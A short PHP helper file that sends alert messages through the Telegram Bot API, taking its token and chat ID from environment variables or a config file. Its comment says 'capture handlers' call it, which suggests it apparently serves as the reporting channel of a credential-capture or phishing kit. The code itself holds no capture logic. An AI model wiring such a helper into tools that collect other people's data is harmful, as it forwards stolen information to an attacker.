<?php
// telegram_alert.php
// Called by any capture handler to fire a Telegram message instantly.
// Set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in config.php or env vars.

$BOT_TOKEN = getenv('TELEGRAM_BOT_TOKEN') ?: (file_exists(__DIR__.'/telegram_config.php') ? (include __DIR__.'/telegram_config.php') : '');
$CHAT_ID   = getenv('TELEGRAM_CHAT_ID')   ?: '';

// Load from config file if env not set
if (file_exists(__DIR__ . '/telegram_config.php')) {
    $cfg = include __DIR__ . '/telegram_config.php';
    if (is_array($cfg)) {
        if (!$BOT_TOKEN && isset($cfg['token'])) $BOT_TOKEN = $cfg['token'];
        if (!$CHAT_ID   && isset($cfg['chat_id'])) $CHAT_ID  = $cfg['chat_id'];
    }
}

function send_telegram($token, $chat_id, $text) {
    if (!$token || !$chat_id) return;
    $url  = "https://api.telegram.org/bot{$token}/sendMessage";
    $data = http_build_query(['chat_id' => $chat_id, 'text' => $text, 'parse_mode' => 'HTML']);
    $ctx  = stream_context_create(['http' => [
        'method'  => 'POST',
        'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
        'content' => $data,
        'timeout' => 5,
    ]]);
    @file_get_contents($url, false, $ctx);
}

function telegram_alert($message) {
    global $BOT_TOKEN, $CHAT_ID;
    send_telegram($BOT_TOKEN, $CHAT_ID, $message);
}
